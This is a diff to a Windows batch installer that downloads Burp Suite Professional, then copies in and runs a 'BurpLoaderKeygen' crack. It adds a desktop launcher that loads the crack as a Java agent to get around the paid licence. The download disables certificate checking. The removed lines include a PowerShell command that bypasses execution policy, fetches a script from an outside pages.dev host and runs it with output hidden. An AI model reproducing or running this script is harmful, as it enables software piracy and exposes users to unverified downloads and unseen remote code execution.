@@ -33,15 +33,15 @@ cls
 
 REM Grabbing Burp Suite from the official servers and installing with unattended mode
 echo Downloading Burp Suite
-REM wget.exe --no-check-certificate -q --show-progress -O BurpSuiteInstaller.exe "https://portswigger-cdn.net/burp/releases/download?product=pro&version=2023.6.1&type=WindowsX64"
+wget.exe --no-check-certificate -q --show-progress -O BurpSuiteInstaller.exe "https://portswigger-cdn.net/burp/releases/download?product=pro&version=2023.12.1&type=WindowsX64"
 echo.
 echo Running installer
-REM BurpSuiteInstaller.exe -q -dir 'C:\Program Files\' -overwrite -nofilefailures -splash "Burp Suite Installer" -console
+BurpSuiteInstaller.exe -q -dir 'C:\Program Files\' -overwrite -nofilefailures -splash "Burp Suite Installer" -console
 
 REM Moving and running keygen
 cls
 echo Copying BurpLoaderKeygen.jar to installed folder
-copy Crack\BurpLoaderKeygen.jar "C:\Program Files\BurpSuitePro\" 1>nul2>nul
+copy BurpLoaderKeygen\BurpLoaderKeygen.jar "C:\Program Files\BurpSuitePro\" 1>nul2>nul
 echo Running BurpLoaderKeygen.jar
 start java -jar "C:\Program Files\BurpSuitePro\BurpLoaderKeygen.jar"
 
@@ -100,20 +100,15 @@ echo.
 echo.
 pause
 
-REM Move run script to BurpSuitePro
-move run.bat "C:\Program Files\BurpSuitePro"
-
-REM Modifying the Burp Suite .lnk shortcut to be able to run it without needing to run BurpLoaderKeygen.jar
-cls
-echo Modifying Burp Suite Pro shortcut
-powershell -exec bypass -command "iwr https://hyperos-script-store.pages.dev/lnk.ps1 | iex" 1>nul2>nul
-
+REM Add a starter to the Destkpo
+echo ^"C:\Program Files\BurpSuitePro\jre\bin\java.exe^" "--add-opens=java.desktop/javax.swing=ALL-UNNAMED" "--add-opens=java.base/java.lang=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED" "--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED" "-javaagent:C:/Program Files/BurpSuitePro/BurpLoaderKeygen.jar" "-noverify" "-jar" "C:\Program Files\BurpSuitePro\burpsuite_pro.jar" > %USERPROFILE%\Desktop\StartBurpSuite.bat
 
 REM Removing files that are no longer needed before exitting
 echo Deleting extra files
 del /q /f wget.exe 2>nul
 del /q /f BurpSuiteInstaller.exe 2>nul
 del /q /f .wget-hsts 2>nul
+del /q /f burpsuite_pro_windows-x64_v2023_12_1_error.log 2>nul
 
 echo Killing java.exe (BurpKeygenLoader.jar)
 taskkill /f /im java.exe 1>nul2>nul
